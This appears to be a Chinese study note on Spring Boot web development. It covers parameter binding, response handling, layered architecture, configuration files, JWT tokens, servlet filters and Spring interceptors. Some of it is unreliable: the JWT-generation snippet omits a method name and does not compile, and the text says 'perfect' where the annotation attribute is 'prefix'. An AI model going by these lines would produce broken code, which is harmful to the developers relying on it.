- User类中有一个Address类型的属性（Address是一个实体类）

![image-20230808230653724](./img/小米虫爬山路-img/image-20230808230653724.png)

复杂实体对象的封装，需要遵守如下规则：

- **请求参数名与形参对象属性名相同，按照对象层次结构关系即可接收嵌套实体类属性参数。**

#### 1.3 数组集合参数

数组集合参数的使用场景：在HTML的表单中，有一个表单项是支持多选的(复选框)，可以提交选择的多个值。

![image-20230808232434749](./img/小米虫爬山路-img/image-20230808232434749.png)

多个值是怎么提交的呢？其实多个值也是一个一个的提交。

![image-20230808232453361](./img/小米虫爬山路-img/image-20230808232453361.png)

##### 1.3.1 数组

数组参数：**请求参数名与形参数组名称相同且请求参数为多个，定义数组类型形参即可接收参数**

```java
@RestController
public class RequestController {
    //数组集合参数
    @RequestMapping("/arrayParam")
    public String arrayParam(String[] hobby){
        System.out.println(Arrays.toString(hobby));
        return "OK";
    }
}
```

在前端请求时，有两种传递形式：

方式一： xxxxxxxxxx?hobby=game&hobby=java

![image-20230808232702914](./img/小米虫爬山路-img/image-20230808232702914.png)

方式二：xxxxxxxxxxxxx?hobby=game,java

![image-20230808232716870](./img/小米虫爬山路-img/image-20230808232716870.png)

##### 1.3.2 集合参数

集合参数：**请求参数名与形参集合对象名相同且请求参数为多个，@RequestParam 绑定参数关系**

默认情况下，请求中参数名相同的多个值，是封装到数组。如果要封装到集合，要使用@RequestParam绑定参数关系

![image-20230809001101046](./img/小米虫爬山路-img/image-20230809001101046.png)

Controller方法：

```java
@RestController
public class RequestController {
    //数组集合参数
    @RequestMapping("/listParam")
    public String listParam(@RequestParam List<String> hobby){
        System.out.println(hobby);
        return "OK";
    }
}
```

#### 1.4 日期参数

上述演示的都是一些普通的参数，在一些特殊的需求中，可能会涉及到日期类型数据的封装.

因为日期的格式多种多样（如：2022-12-12 10:05:45 、2022/12/12 10:05:45），那么对于日期类型的参数在进行封装的时候，需要通过@DateTimeFormat注解，以及其pattern属性来设置日期的格式。

![image-20230809001446837](./img/小米虫爬山路-img/image-20230809001446837.png)

- @DateTimeFormat注解的pattern属性中指定了哪种日期格式，前端的日期参数就必须按照指定的格式传递。
- 后端controller方法中，需要使用Date类型或LocalDateTime类型，来封装传递的参数。

Controller方法：

```java
@RestController
public class RequestController {
    //日期时间参数
   @RequestMapping("/dateParam")
    public String dateParam(@DateTimeFormat(pattern = "yyyy-MM-dd HH:mm:ss") LocalDateTime updateTime){
        System.out.println(updateTime);
        return "OK";
    }
}
```

#### 1.5 JSON参数

在学习前端技术时，我们有讲到过JSON，而在前后端进行交互时，如果是比较复杂的参数，前后端通过会使用JSON格式的数据进行传输。 （JSON是开发中最常用的前后端数据交互方式）

我们学习JSON格式参数，主要从以下两个方面着手：

1. Postman在发送请求时，如何传递json格式的请求参数
2. 在服务端的controller方法中，如何接收json格式的请求参数

Postman发送JSON格式数据：

![image-20230809002221255](./img/小米虫爬山路-img/image-20230809002221255.png)

服务端Controller方法接收JSON格式数据：

- 传递json格式的参数，在Controller中会使用实体类进行封装。 
- 封装规则：**JSON数据键名与形参对象属性名相同，定义POJO类型形参即可接收参数。需要使用 @RequestBody标识。**

![image-20230809084728548](./img/小米虫爬山路-img/image-20230809084728548.png)

@RequestBody注解：将JSON数据映射到形参的实体类对象中（JSON中的key和实体类中的属性名保持一致）

```java
@RestController
public class RequestController {
    //JSON参数
    @RequestMapping("/jsonParam")
    public String jsonParam(@RequestBody User user){
        System.out.println(user);
        return "OK";
    }
}
```

#### 1.6 路径参数

传统的开发中请求参数是放在请求体(POST请求)传递或跟在URL后面通过?key=value的形式传递(GET请求)。

![image-20230809085548413](./img/小米虫爬山路-img/image-20230809085548413.png)

在现在的开发中，经常还会直接在请求的URL中传递参数。例如：

~~~
http://localhost:8080/user/1		
http://localhost:880/user/1/0
~~~

上述的这种传递请求参数的形式呢，我们称之为：路径参数。

学习路径参数呢，主要掌握在后端的controller方法中，如何接收路径参数。

路径参数：

- 前端：通过请求URL直接传递参数
- 后端：使用{…}来标识该路径参数，需要使用@PathVariable获取路径参数

![image-20230809085714778](./img/小米虫爬山路-img/image-20230809085714778.png)

```java
 @RequestMapping("/path/{id}")
    public String pathParam(@PathVariable Integer id){
        System.out.println(id);
        return "OK";
    }
```

### 2、SpringBoot响应

前面我们学习过HTTL协议的交互方式：请求响应模式（有请求就有响应）

那么Controller程序呢，除了接收请求外，还可以进行响应。

#### 2.1 @ResponseBody

在我们前面所编写的controller方法中，都已经设置了响应数据。

![image-20230809090421911](./img/小米虫爬山路-img/image-20230809090421911.png)

controller方法中的return的结果，怎么就可以响应给浏览器呢？

答案：使用@ResponseBody注解

**@ResponseBody注解：**

- 类型：方法注解、类注解
- 位置：书写在Controller方法上或类上
- 作用：将方法返回值直接响应给浏览器
  - 如果返回值类型是实体对象/集合，将会转换为JSON格式后在响应给浏览器

但是在我们所书写的Controller中，只在类上添加了@RestController注解、方法添加了@RequestMapping注解，并没有使用@ResponseBody注解，怎么给浏览器响应呢？

~~~java
@RestController
public class HelloController {
    @RequestMapping("/hello")
    public String hello(){
        System.out.println("Hello World ~");
        return "Hello World ~";
    }
}
~~~

原因：在类上添加的@RestController注解，是一个组合注解。

- @RestController = @Controller + @ResponseBody 

@RestController源码：

~~~java
@Target({ElementType.TYPE})   //元注解（修饰注解的注解）
@Retention(RetentionPolicy.RUNTIME)  //元注解
@Documented    //元注解
@Controller   
@ResponseBody 
public @interface RestController {
    @AliasFor(
        annotation = Controller.class
    )
    String value() default "";
}
~~~

结论：在类上添加@RestController就相当于添加了@ResponseBody注解。

#### 2.2 统一响应结果

大家有没有发现一个问题，我们在前面所编写的这些Controller方法中，返回值各种各样，没有任何的规范。

![image-20230809090925243](./img/小米虫爬山路-img/image-20230809090925243.png)

如果我们开发一个大型项目，项目中controller方法将成千上万，使用上述方式将造成整个项目难以维护。那在真实的项目开发中是什么样子的呢？

在真实的项目开发中，无论是哪种方法，我们都会定义一个统一的返回结果。方案如下：

![image-20230809091020289](./img/小米虫爬山路-img/image-20230809091020289.png)

> 前端：只需要按照统一格式的返回结果进行解析(仅一种解析方案)，就可以拿到数据。

统一的返回结果使用类来描述，在这个结果中包含：

- 响应状态码：当前请求是成功，还是失败

- 状态码信息：给页面的提示信息

- 返回的数据：给前端响应的数据（字符串、对象、集合）

定义在一个实体类Result来包含以上信息。代码如下：

### 3、分层解耦

#### 3.1 三层架构

在我们进行程序设计以及程序开发时，尽可能让每一个接口、类、方法的职责更单一些（单一职责原则）。

> 单一职责原则：一个类或一个方法，就只做一件事情，只管一块功能。
>
> 这样就可以让类、接口、方法的复杂度更低，可读性更强，扩展性更好，也更利用后期的维护。

我们之前开发的程序呢，并不满足单一职责原则。下面我们来分析下之前的程序：

![image-20230809101141079](./img/小米虫爬山路-img/image-20230809101141079.png)

那其实我们上述案例的处理逻辑呢，从组成上看可以分为三个部分：

- 数据访问：负责业务数据的维护操作，包括增、删、改、查等操作。
- 逻辑处理：负责业务逻辑处理的代码。
- 请求处理、响应数据：负责，接收页面的请求，给页面响应数据。

按照上述的三个组成部分，在我们项目开发中呢，可以将代码分为三层：

![image-20230809101204386](./img/小米虫爬山路-img/image-20230809101204386.png)

- Controller：控制层。接收前端发送的请求，对请求进行处理，并响应数据。
- Service：业务逻辑层。处理具体的业务逻辑。
- Dao：数据访问层(Data Access Object)，也称为持久层。负责数据访问操作，包括数据的增、删、改、查。

基于三层架构的程序执行流程：

![image-20230809101219596](./img/小米虫爬山路-img/image-20230809101219596.png)

- 前端发起的请求，由Controller层接收（Controller响应数据给前端）
- Controller层调用Service层来进行逻辑处理（Service层处理完后，把处理结果返回给Controller层）
- Serivce层调用Dao层（逻辑处理过程中需要用到的一些数据要从Dao层获取）
- Dao层操作文件中的数据（Dao拿到的数据会返回给Service层）

> 思考：按照三层架构的思想，如何要对业务逻辑(Service层)进行变更，会影响到Controller层和Dao层吗？ 
>
> 答案：不会影响。 （程序的扩展性、维护性变得更好了）

#### 3.2 代码拆分

我们使用三层架构思想，来改造下之前的程序：

- 控制层包名：xxxx.controller
- 业务逻辑层包名：xxxx.service
- 数据访问层包名：xxxx.dao

![image-20230809101439778](./img/小米虫爬山路-img/image-20230809101439778.png)

![image-20230809102823240](./img/小米虫爬山路-img/image-20230809102823240.png)

#### 3.3 分层解耦

刚才我们学习过程序分层思想了，接下来呢，我们来学习下程序的解耦思想。

解耦：解除耦合

##### 3.3.1 耦合问题

首先需要了解软件开发涉及到的两个概念：内聚和耦合。

- 内聚：软件中各个功能模块内部的功能联系。

- 耦合：衡量软件中各个层/模块之间的依赖、关联的程度。

**软件设计原则：高内聚低耦合。**

> 高内聚指的是：一个模块中各个元素之间的联系的紧密程度，如果各个元素(语句、程序段)之间的联系程度越高，则内聚性越高，即 "高内聚"。
>
> 低耦合指的是：软件中各个层、模块之间的依赖关联程序越低越好。

#### 3.4 解耦思路

之前我们在编写代码时，需要什么对象，就直接new一个就可以了。 这种做法呢，层与层之间代码就耦合了，当service层的实现变了之后， 我们还需要修改controller层的代码。

![image-20230809103647671](./img/小米虫爬山路-img/image-20230809103647671.png)

我们想要实现上述解耦操作，就涉及到Spring中的两个核心概念：

- **控制反转：** Inversion Of Control，简称IOC。对象的创建控制权由程序自身转移到外部（容器），这种思想称为控制反转。

  > 对象的创建权由程序员主动创建转移到容器(由容器创建、管理对象)。这个容器称为：IOC容器或Spring容器

- **依赖注入：** Dependency Injection，简称DI。容器为应用程序提供运行时，所依赖的资源，称之为依赖注入。

  > 程序运行时需要某个资源，此时容器就为其提供这个资源。
  >
  > 例：EmpController程序运行时需要EmpService对象，Spring容器就为其提供并注入EmpService对象

IOC容器中创建、管理的对象，称之为：bean对象

### 4、配置文件

#### 4.1 参数配置化

当我们需要配置某些参数时，我们是直接写死在java代码中了(硬编码)，如果我们在做项目时每涉及到一个第三方技术服务，就将其参数硬编码，那么在Java程序中会存在两个问题：

1. 如果这些参数发生变化了，就必须在源程序代码中改动这些参数，然后需要重新进行代码的编译，将Java代码编译成class字节码文件再重新运行程序。（比较繁琐）
2. 如果我们开发的是一个真实的企业级项目， Java类可能会有很多，如果将这些参数分散的定义在各个Java类当中，我们要修改一个参数值，我们就需要在众多的Java代码当中来定位到对应的位置，再来修改参数，修改完毕之后再重新编译再运行。（参数配置过于分散，是不方便集中的管理和维护）

这样我们就可以把这些参数装入配置文件中

```properties
#自己配置
key1 = value1
key2 = value2
key3 = value3
.....
```

因为application.properties是springboot项目默认的配置文件，所以springboot程序在启动时会默认读取application.properties配置文件，而我们可以使用一个现成的注解：@Value，获取配置文件中的数据。

@Value 注解通常用于外部配置的属性注入，具体用法为： @Value("${配置文件中的key}")

```java
@Value("${key1}")
private int 参数1
    
    @Value("${key2}")
private String 参数2
    
    @Value("${key3}")
private double 参数3
```

#### 4.2 yml配置文件

前面我们一直使用springboot项目创建完毕后自带的application.properties进行属性的配置，那其实呢，在springboot项目当中是支持多种配置方式的，除了支持properties配置文件以外，还支持另外一种类型的配置文件，就是我们接下来要讲解的yml格式的配置文件。

- application.properties

  ```properties
  server.port=8080
  server.address=127.0.0.1
  ```

- application.yml 

  ```yml
  server:
    port: 8080
    address: 127.0.0.1
  ```

- application.yaml 

  ```yml
  server:
    port: 8080
    address: 127.0.0.1
  ```


> yml 格式的配置文件，后缀名有两种：
>
> - yml （推荐）
> - yaml

常见配置文件格式对比：

![image-20230102181215809](./img/小米虫爬山路-img/image-20230102181215809.png)

我们可以看到配置同样的数据信息，yml格式的数据有以下特点：

- 容易阅读
- 容易与脚本语言交互
- 以数据为核心，重数据轻格式



简单的了解过springboot所支持的配置文件，以及不同类型配置文件之间的优缺点之后，接下来我们就来了解下yml配置文件的基本语法：

- 大小写敏感
- 数值前边必须有空格，作为分隔符
- 使用缩进表示层级关系，缩进时，不允许使用Tab键，只能用空格（idea中会自动将Tab转换为空格）
- 缩进的空格数目不重要，只要相同层级的元素左侧对齐即可
- `#`表示注释，从这个字符一直到行尾，都会被解析器忽略

![image-20230810204754638](./img/小米虫爬山路-img/image-20230810204754638.png)

了解完yml格式配置文件的基本语法之后，接下来我们再来看下yml文件中常见的数据格式。在这里我们主要介绍最为常见的两类：

1. 定义对象或Map集合
2. 定义数组、list或set集合

对象/Map集合

```yml
user:
  name: zhangsan
  age: 18
  password: 123456
```

数组/List/Set集合

```yml
hobby: 
  - java
  - game
  - sport
```

#### 4.3 @ConfigurationProperties

当我们在配置文件中配置了参数的值后，需要在对应的地方使用@Value注解来获取值，这样就使得代码非常臃肿不易观察。

那么有没有一种方式可以简化这些配置参数的注入呢？答案是肯定有，在Spring中给我们提供了一种简化方式，可以直接将配置文件中配置项的值自动的注入到对象的属性中。



Spring提供的简化方式套路：

1. 需要创建一个实现类，且实体类中的属性名和配置文件当中key的名字必须要一致

   > 比如：配置文件当中叫endpoints，实体类当中的属性也得叫endpoints，另外实体类当中的属性还需要提供 getter / setter方法

2. 需要将实体类交给Spring的IOC容器管理，成为IOC容器当中的bean对象

3. 在实体类上添加`@ConfigurationProperties`注解，并通过perfect属性来指定配置参数项的前缀

![image-20230810210336566](./img/小米虫爬山路-img/image-20230810210336566.png)

@ConfigurationProperties注解我们已经介绍完了，接下来我们就来区分一下@ConfigurationProperties注解以及我们前面所介绍的另外一个@Value注解：

相同点：都是用来注入外部配置的属性的。

不同点：

- @Value注解只能一个一个的进行外部属性的注入。

- @ConfigurationProperties可以批量的将外部的属性配置注入到bean对象的属性中。

如果要注入的属性非常的多，并且还想做到复用，就可以定义这么一个bean对象。通过 configuration properties 批量的将外部的属性配置直接注入到 bin 对象的属性当中。在其他的类当中，我要想获取到注入进来的属性，我直接注入 bin 对象，然后调用 get 方法，就可以获取到对应的属性值了



### 5、统一拦截技术

问题引入：当我们做了一个前端项目后，会有一个登录进入后面的页面，登陆时我们会向后端发送请求在后端检查到有这个账号并且密码正确后就会放行进入后面的页面，但是如果我们把只有登录后才能出现的页面的网址记下来后，在浏览器上复制粘贴后还是会进入不论登没登录。

而真正的登录功能应该是：登陆后才能访问后端系统页面，不登陆则跳转登陆页面进行登陆。

为什么会出现这个问题？其实原因很简单，就是因为针对于我们当前所开发的部门管理、员工管理以及文件上传等相关接口来说，我们在服务器端并没有做任何的判断，没有去判断用户是否登录了。所以无论用户是否登录，都可以访问部门管理以及员工管理的相关数据。所以我们目前所开发的登录功能，它只是徒有其表。而我们要想解决这个问题，我们就需要完成一步非常重要的操作：**登录校验。**



首先我们在宏观上先有一个认知：

前面在讲解HTTP协议的时候，我们提到HTTP协议是无状态协议。什么又是无状态的协议？

所谓无状态，**指的是每一次请求都是独立的**，下一次请求并不会携带上一次请求的数据。而浏览器与服务器之间进行交互，基于HTTP协议也就意味着现在我们通过浏览器来访问了登陆这个接口，实现了登陆的操作，接下来我们在执行其他业务操作时，服务器也并不知道这个员工到底登陆了没有。因为HTTP协议是无状态的，两次请求之间是独立的，所以是无法判断这个员工到底登陆了没有。

> 我们可以使用一种技术：统一拦截技术。
>
> 通过统一拦截的技术，我们可以来拦截浏览器发送过来的所有的请求，拦截到这个请求之后，就可以通过请求来获取之前所存入的登录标记，在获取到登录标记且标记为登录成功，就说明员工已经登录了。如果已经登录，我们就直接放行(意思就是可以访问正常的业务接口了)。

我们要完成以上操作，会涉及到web开发中的两个技术：

1. 会话技术
2. 统一拦截技术

而统一拦截技术现实方案也有两种：

1. Servlet规范中的Filter过滤器
2. Spring提供的interceptor拦截器

我们直接跳过会话技术学习令牌技术

#### 5.1 JWT令牌

这里所提到的令牌就是用户身份的标识，其本质就是一个字符串。令牌的形式有很多，我们使用的是功能强大的 JWT令牌。

##### 5.1.1 介绍

JWT全称：JSON Web Token  （官网：https://jwt.io/）

- 定义了一种简洁的、自包含的格式，用于在通信双方以json数据格式安全的传输信息。由于数字签名的存在，这些信息是可靠的。

  > 简洁：是指jwt就是一个简单的字符串。可以在请求参数或者是请求头当中直接传递。
  >
  > 自包含：指的是jwt令牌，看似是一个随机的字符串，但是我们是可以根据自身的需求在jwt令牌中存储自定义的数据内容。如：可以直接在jwt令牌中存储用户的相关信息。
  >
  > 简单来讲，jwt就是将原始的json数据格式进行了安全的封装，这样就可以直接基于jwt在通信双方安全的进行信息传输了。

JWT的组成： （JWT令牌由三个部分组成，三个部分之间使用英文的点来分割）

- 第一部分：Header(头）， 记录令牌类型、签名算法等。 例如：{"alg":"HS256","type":"JWT"}

- 第二部分：Payload(有效载荷），携带一些自定义信息、默认信息等。 例如：{"id":"1","username":"Tom"}

- 第三部分：Signature(签名），防止Token被篡改、确保安全性。将header、payload，并加入指定秘钥，通过指定签名算法计算而来。

  >签名的目的就是为了防jwt令牌被篡改，而正是因为jwt令牌最后一个部分数字签名的存在，所以整个jwt 令牌是非常安全可靠的。一旦jwt令牌当中任何一个部分、任何一个字符被篡改了，整个令牌在校验的时候都会失败，所以它是非常安全可靠的。

![image-20230811093610120](./img/小米虫爬山路-img/image-20230811093610120.png)

> JWT是如何将原始的JSON格式数据，转变为字符串的呢？
>
> 其实在生成JWT令牌时，会对JSON格式的数据进行一次编码：进行base64编码
>
> Base64：是一种基于64个可打印的字符来表示二进制数据的编码方式。既然能编码，那也就意味着也能解码。所使用的64个字符分别是A到Z、a到z、 0- 9，一个加号，一个斜杠，加起来就是64个字符。任何数据经过base64编码之后，最终就会通过这64个字符来表示。当然还有一个符号，那就是等号。等号它是一个补位的符号
>
> 需要注意的是Base64是编码方式，而不是加密方式。

JWT令牌最典型的应用场景就是登录认证：

1. 在浏览器发起请求来执行登录操作，此时会访问登录的接口，如果登录成功之后，我们需要生成一个jwt令牌，将生成的 jwt令牌返回给前端。
2. 前端拿到jwt令牌之后，会将jwt令牌存储起来。在后续的每一次请求中都会将jwt令牌携带到服务端。
3. 服务端统一拦截请求之后，先来判断一下这次请求有没有把令牌带过来，如果没有带过来，直接拒绝访问，如果带过来了，还要校验一下令牌是否是有效。如果有效，就直接放行进行请求的处理。



在JWT登录认证的场景中我们发现，整个流程当中涉及到两步操作：

1. 在登录成功之后，要生成令牌。
2. 每一次请求当中，要接收令牌并对令牌进行校验。

稍后我们再来学习如何来生成jwt令牌，以及如何来校验jwt令牌。



#### 5.1.2 生成校验

首先我们先来实现JWT令牌的生成。要想使用JWT令牌，需要先引入JWT的依赖：

```xml
<!-- JWT依赖-->
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt</artifactId>
    <version>0.9.1</version>
</dependency>
```

> 在引入完JWT来赖后，就可以调用工具包中提供的API来完成JWT令牌的生成和校验
>
> 工具类：Jwts



生成JWT代码实现：

~~~java
@Test
public void genJwt(){
    Map<String,Object> claims = new HashMap<>();
    claims.put("id",1);
    claims.put("username","Tom");
    
    String jwt = Jwts.builder()
        .signWith(SignatureAlgorithm.HS256, "itheima") //签名算法  
        .setClaims(claims) //自定义内容(载荷)          
        .(new Date(System.currentTimeMillis() + 24*3600*1000)) //有效期   
        .compact();
    
    System.out.println(jwt);
}
~~~

实现了JWT令牌的生成，下面我们接着使用Java代码来校验JWT令牌(解析生成的令牌)：

~~~java
@Test
public void parseJwt(){
    Claims claims = Jwts.parser()
        .setSigningKey("itheima")//指定签名密钥（必须保证和生成令牌时使用相同的签名密钥）  
	.parseClaimsJws("eyJhbGciOiJIUzI1NiJ9.eyJpZCI6MSwiZXhwIjoxNjcyNzI5NzMwfQ.fHi0Ub8npbyt71UqLXDdLyipptLgxBUg_mSuGJtXtBk")
        .getBody();
    System.out.println(claims);
}
~~~

通过以上测试，我们在使用JWT令牌时需要注意：

- JWT校验时使用的签名秘钥，必须和生成JWT令牌时使用的秘钥是配套的。

- 如果JWT令牌解析校验时报错，则说明 JWT令牌被篡改 或 失效了，令牌非法。 

### 6、过滤器Filter(非Spring技术)

刚才通过浏览器的开发者工具，我们可以看到在后续的请求当中，都会在请求头中携带JWT令牌到服务端，而服务端需要统一拦截所有的请求，从而判断是否携带的有合法的JWT令牌。
那怎么样来统一拦截到所有的请求校验令牌的有效性呢？这里我们会学习两种解决方案：

1. Filter过滤器
2. Interceptor拦截器

我们首先来学习过滤器Filter。

#### 6.1 快速入门

什么是Filter？

- Filter表示过滤器，是 JavaWeb三大组件(Servlet、Filter、Listener)之一。
- 过滤器可以把对资源的请求拦截下来，从而实现一些特殊的功能
  - 使用了过滤器之后，要想访问web服务器上的资源，必须先经过滤器，过滤器处理完毕之后，才可以访问对应的资源。
- 过滤器一般完成一些通用的操作，比如：登录校验、统一编码处理、敏感字符处理等。

下面我们通过Filter快速入门程序掌握过滤器的基本使用操作：

- 第1步，定义过滤器 ：1.定义一个类，实现 Filter 接口，并重写其所有方法。
- 第2步，配置过滤器：Filter类上加 @WebFilter 注解，配置拦截资源的路径。在启动类上加 @ServletComponentScan 开启Servlet组件支持。

**定义过滤器**

~~~java
//定义一个类，实现一个标准的Filter过滤器的接口
@WebFilter(urlPatterns = "/*") //配置过滤器要拦截的请求路径（ /* 表示拦截浏览器的所有请求 ）
public class DemoFilter implements Filter {
    @Override //初始化方法, 只调用一次
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("init 初始化方法执行了");
    }

    @Override //拦截到请求之后调用, 调用多次
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        System.out.println("Demo 拦截到了请求...放行前逻辑");
        //放行
        chain.doFilter(request,response);
    }

    @Override //销毁方法, 只调用一次
    public void destroy() {
        System.out.println("destroy 销毁方法执行了");
    }
}

~~~

```java
@ServletComponentScan
@SpringBootApplication
public class TliasWebManagementApplication {

    public static void main(String[] args) {
        SpringApplication.run(TliasWebManagementApplication.class, args);
    }

}
```

> - init方法：过滤器的初始化方法。在web服务器启动的时候会自动的创建Filter过滤器对象，在创建过滤器对象的时候会自动调用init初始化方法，这个
>
> - 方法只会被调用一次。
>
> - doFilter方法：这个方法是在每一次拦截到请求之后都会被调用，所以这个方法是会被调用多次的，每拦截到一次请求就会调用一次doFilter()方法。
>
> - destroy方法： 是销毁的方法。当我们关闭服务器的时候，它会自动的调用销毁方法destroy，而这个销毁方法也只会被调用一次。

注意事项：在过滤器Filter中，如果不执行放行操作，将无法访问后面的资源。 放行操作：chain.doFilter(request, response);

#### 6.2 Filter详解

Filter过滤器的快速入门程序我们已经完成了，接下来我们就要详细的介绍一下过滤器Filter在使用中的一些细节。主要介绍以下3个方面的细节：

1. 过滤器的执行流程
2. 过滤器的拦截路径配置
3. 过滤器链

##### 6.2.1 执行流程

![image-20230811110029438](./img/小米虫爬山路-img/image-20230811110029438.png)

过滤器当中我们拦截到了请求之后，如果希望继续访问后面的web资源，就要执行放行操作，放行就是调用 FilterChain对象当中的doFilter()方法，在调用doFilter()这个方法之前所编写的代码属于放行之前的逻辑。

在放行后访问完 web 资源之后还会回到过滤器当中，回到过滤器之后如有需求还可以执行放行之后的逻辑，放行之后的逻辑我们写在doFilter()这行代码之后。

##### 6.2.2 拦截路径

执行流程我们搞清楚之后，接下来再来介绍一下过滤器的拦截路径，Filter可以根据需求，配置不同的拦截资源路径：

| 拦截路径     | urlPatterns值 | 含义                               |
| ------------ | ------------- | ---------------------------------- |
| 拦截具体路径 | /login        | 只有访问 /login 路径时，才会被拦截 |
| 目录拦截     | /emps/*       | 访问/emps下的所有资源，都会被拦截  |
| 拦截所有     | /*            | 访问所有资源，都会被拦截           |

##### 6.2.3 过滤器链

最后我们在来介绍下过滤器链，什么是过滤器链呢？所谓过滤器链指的是在一个web应用程序当中，可以配置多个过滤器，多个过滤器就形成了一个过滤器链。

![image-20230811110426146](./img/小米虫爬山路-img/image-20230811110426146.png)

以上就是当我们在web应用当中配置了多个过滤器，形成了这样一个过滤器链以及过滤器链的执行顺序。下面我们通过idea来验证下过滤器链。

验证步骤：

1. 在filter包下再来新建一个Filter过滤器类：AbcFilter
2. 在AbcFilter过滤器中编写放行前和放行后逻辑
3. 配置AbcFilter过滤器拦截请求路径为：/* 
4. 重启SpringBoot服务，查看DemoFilter、AbcFilter的执行日志

**AbcFilter过滤器**

~~~java
@WebFilter(urlPatterns = "/*")
public class AbcFilter implements Filter {
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        System.out.println("Abc 拦截到了请求... 放行前逻辑");

        //放行
        chain.doFilter(request,response);

        System.out.println("Abc 拦截到了请求... 放行后逻辑");
    }
}
~~~

**DemoFilter过滤器**

~~~java
@WebFilter(urlPatterns = "/*") 
public class DemoFilter implements Filter {
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("DemoFilter   放行前逻辑.....");

        //放行请求
        filterChain.doFilter(servletRequest,servletResponse);

        System.out.println("DemoFilter   放行后逻辑.....");
    }
}
~~~

大家发现AbcFilter先执行DemoFilter后执行，这是为什么呢？

其实是和过滤器的类名有关系。以注解方式配置的Filter过滤器，它的执行优先级是按时过滤器类名的自动排序确定的，类名排名越靠前，优先级越高。

假如我们想让DemoFilter先执行，怎么办呢？答案就是修改类名。

### 7、拦截器Interceptor

学习完了过滤器Filter之后，接下来我们继续学习拦截器Interseptor。

拦截器我们主要分为三个方面进行讲解：

1. 介绍下什么是拦截器，并通过快速入门程序上手拦截器
2. 拦截器的使用细节
3. 通过拦截器Interceptor完成登录校验功能

我们先学习第一块内容：拦截器快速入门

#### 7.1 快速入门

什么是拦截器？

- 是一种动态拦截方法调用的机制，类似于过滤器。
- 拦截器是Spring框架中提供的，用来动态拦截控制器方法的执行。

拦截器的作用：

- 拦截请求，在指定方法调用前后，根据业务需要执行预先设定的代码。



在拦截器当中，我们通常也是做一些通用性的操作，比如：我们可以通过拦截器来拦截前端发起的请求，将登录校验的逻辑全部编写在拦截器当中。在校验的过程当中，如发现用户登录了(携带JWT令牌且是合法令牌)，就可以直接放行，去访问spring当中的资源。如果校验时发现并没有登录或是非法令牌，就可以直接给前端响应未登录的错误信息。

下面我们通过快速入门程序，来学习下拦截器的基本使用。拦截器的使用步骤和过滤器类似，也分为两步：

1. 定义拦截器

2. 注册配置拦截器

**自定义拦截器：**实现HandlerInterceptor接口，并重写其所有方法

~~~java
//自定义拦截器
@Component
public class LoginCheckInterceptor implements HandlerInterceptor {
    //目标资源方法执行前执行。 返回true：放行    返回false：不放行
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        System.out.println("preHandle .... ");
        
        return true; //true表示放行
    }

    //目标资源方法执行后执行
    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
        System.out.println("postHandle ... ");
    }

    //视图渲染完毕后执行，最后执行
    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        System.out.println("afterCompletion .... ");
    }
}
~~~



> 注意：
>
> ​	preHandle方法：目标资源方法执行前执行。 返回true：放行    返回false：不放行
>
> ​	postHandle方法：目标资源方法执行后执行
>
> ​	afterCompletion方法：视图渲染完毕后执行，最后执行



**注册配置拦截器**：实现WebMvcConfigurer接口，并重写addInterceptors方法

~~~java
@Configuration  
public class WebConfig implements WebMvcConfigurer {

    //自定义的拦截器对象
    @Autowired
    private LoginCheckInterceptor loginCheckInterceptor;

    
    @Override
    public void addInterceptors(InterceptorRegistry registry) {
       //注册自定义拦截器对象
        registry.addInterceptor(loginCheckInterceptor).addPathPatterns("/**");//设置拦截器拦截的请求路径（ /** 表示拦截所有请求）
    }
}
~~~

#### 7.2 Interceptor详解

拦截器的入门程序完成之后，接下来我们来介绍拦截器的使用细节。拦截器的使用细节我们主要介绍两个部分：

1. 拦截器的拦截路径配置
2. 拦截器的执行流程

##### 7.2.1 拦截路径

首先我们先来看拦截器的拦截路径的配置，在注册配置拦截器的时候，我们要指定拦截器的拦截路径，通过`addPathPatterns("要拦截路径")`方法，就可以指定要拦截哪些资源。

在入门程序中我们配置的是`/**`，表示拦截所有资源，而在配置拦截器时，不仅可以指定要拦截哪些资源，还可以指定不拦截哪些资源，只需要调用`excludePathPatterns("不拦截路径")`方法，指定哪些资源不需要拦截。

```java
@Configuration  
public class WebConfig implements WebMvcConfigurer {

    //拦截器对象
    @Autowired
    private LoginCheckInterceptor loginCheckInterceptor;

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        //注册自定义拦截器对象
        registry.addInterceptor(loginCheckInterceptor)
                .addPathPatterns("/**")//设置拦截器拦截的请求路径（ /** 表示拦截所有请求）
                .excludePathPatterns("/login");//设置不拦截的请求路径
    }
}
```





在拦截器中除了可以设置`/**`拦截所有资源外，还有一些常见拦截路径设置：

| 拦截路径  | 含义                 | 举例                                                |
| --------- | -------------------- | --------------------------------------------------- |
| /*        | 一级路径             | 能匹配/depts，/emps，/login，不能匹配 /depts/1      |
| /**       | 任意级路径           | 能匹配/depts，/depts/1，/depts/1/2                  |
| /depts/*  | /depts下的一级路径   | 能匹配/depts/1，不能匹配/depts/1/2，/depts          |
| /depts/** | /depts下的任意级路径 | 能匹配/depts，/depts/1，/depts/1/2，不能匹配/emps/1 |

##### 7.2.2 执行流程

介绍完拦截路径的配置之后，接下来我们再来介绍拦截器的执行流程。通过执行流程，大家就能够清晰的知道过滤器与拦截器的执行时机。

![image-20230107112136151](./img/小米虫爬山路-img/image-20230107112136151.png)

- 当我们打开浏览器来访问部署在web服务器当中的web应用时，此时我们所定义的过滤器会拦截到这次请求。拦截到这次请求之后，它会先执行放行前的逻辑，然后再执行放行操作。而由于我们当前是基于springboot开发的，所以放行之后是进入到了spring的环境当中，也就是要来访问我们所定义的controller当中的接口方法。

- Tomcat并不识别所编写的Controller程序，但是它识别Servlet程序，所以在Spring的Web环境中提供了一个非常核心的Servlet：DispatcherServlet（前端控制器），所有请求都会先进行到DispatcherServlet，再将请求转给Controller。

